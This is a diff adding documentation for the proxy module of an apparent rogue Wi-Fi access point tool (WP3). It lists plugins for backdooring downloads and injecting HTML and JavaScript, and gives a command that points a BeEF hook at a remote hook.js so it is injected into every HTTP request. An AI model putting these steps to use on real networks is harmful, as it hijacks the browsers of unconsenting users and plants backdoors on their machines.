@@ -1,0 +1,51 @@
+---
+title: 'Proxies'
+description: 'The proxies are designed to add features to WP3 core and run parallel with access point (AP).'
+---
+
+### Proxies
+
+The proxies are designed to add features to WP3 core and run parallel with access point (AP),
+but redirect all traffic with `iptables`. Proxies work by intercepting a request, modifying the request if necessary, then handling or forwarding the request to its destination. When a user connects to a AP, the transparent proxy intercepts the request before passing it on to the provider.  
+
+{% include alert.html type="info" content="The most important is you can run one proxies each time , because the proxies has been designed to work for manipulate data packets redirecting all data for a specific port number" %}
+
+Avaliable proxies:
+
+- **pumpkinproxy** - Proxy for intercept network traffic on TCP protocol [doc](#pumpkinproxy)
+- **captiveflask** - Allow block Internet access for users until they open the page login page. [doc](#captiveflask)
+- **noproxy** - Runnning without proxy redirect traffic
+
+The basic command guidelines to get a plugins are:
+
+if you want to select the proxy, follow command bellow. 
+```bash
+wp3 > set proxy proxy_name
+```
+
+if the proxy has plugins, when type `proxies` you see somes options for set. you can to enable/disable plugin command, type `tab` to autocomplete ;): 
+```bash
+wp3 > set proxy_name.plugin_name true/false
+```
+
+The example above is for enable/disable a plugin, but you can use same sintax to configure plugin paramenter. you can see this paramenter typing `info proxy_name` or using type like this example bellow, using `tab` to autocomplete.
+
+```bash
+wp3 > set pumpkinproxy.
+pumpkinproxy.beef                            pumpkinproxy.html_inject
+pumpkinproxy.beef.url_hook                   pumpkinproxy.html_inject.content_path
+pumpkinproxy.downloadspoof                   pumpkinproxy.js_inject
+pumpkinproxy.downloadspoof.backdoorExePath   pumpkinproxy.js_inject.url
+pumpkinproxy.downloadspoof.backdoorPDFpath   pumpkinproxy.no-cache
+pumpkinproxy.downloadspoof.backdoorWORDpath  pumpkinproxy.replaceImages
+pumpkinproxy.downloadspoof.backdoorXLSpath   pumpkinproxy.replaceImages.path
+wp3 > set pumpkinproxy.
+```
+
+let now set `url_hook` parameter the plugin beef to inject javascript in all request http.
+
+```bash
+wp3 > set pumpkinproxy.beef.url_hook http://172.16.149.141:3000/hook.js
+```
+
+Proxies developers and users are welcome to include your proxy into this project, take a look the guidelines [how to create a proxy](#development).
